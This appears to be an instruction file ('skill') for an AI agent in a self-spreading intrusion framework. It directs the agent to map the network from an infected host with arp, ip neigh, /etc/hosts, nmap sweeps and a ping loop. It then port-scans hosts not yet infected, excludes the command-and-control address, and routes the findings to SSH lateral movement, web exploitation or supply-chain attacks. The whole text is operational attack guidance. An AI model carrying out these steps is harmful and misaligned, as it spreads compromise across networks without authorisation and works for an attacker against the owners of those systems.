## Recon Skill

Objective: Discover all live hosts reachable from the infected host and identify the services they expose.

### Phase 1 — On initial registration (no results yet)

Issue passive neighbor discovery commands to reveal hosts already in caches:
- "arp -a"
- "ip neigh show"
- "cat /etc/hosts"

### Phase 2 — When you receive ARP or neighbor results

Determine the local subnet from the host's IP (e.g., if the host is 10.x.x.y, sweep 10.x.x.0/24).

If "nmap" is in the host's tools list, issue a host discovery sweep:
- "nmap -sn <local_subnet>/24"

If nmap is not available, issue a fast ping sweep for the first 30 host addresses:
- "for i in $(seq 1 30); do (ping -c1 -W1 <subnet>.$i &>/dev/null && echo <subnet>.$i alive) & done; wait"

After dispatching, return [] — do not issue further recon commands until sweep results arrive.

### Phase 3 — When you receive host discovery results

For each live IP that is NOT already in already_infected and is not the local C2 address (compare against the C2_HOST env var), issue a service port scan:
- "nmap --top-ports 1000 <ip1> <ip2> ..."

Scan specific IPs only — do not pass a /24 range to this scan.
After dispatching the port scan, return [] — do not issue further commands until results arrive.

### Phase 4 — When you receive port scan results

Recon is complete. Return [].

Interpret the scan to choose the next action:
- SSH only (port 22) → lateral movement via SSH (see lateral.md)
- HTTP/web service on a non-standard port → web exploitation (see exploit.md)
- Git daemon or similar version control service → supply chain technique (see lateral.md)

Do not re-issue any command already in this host's command history.
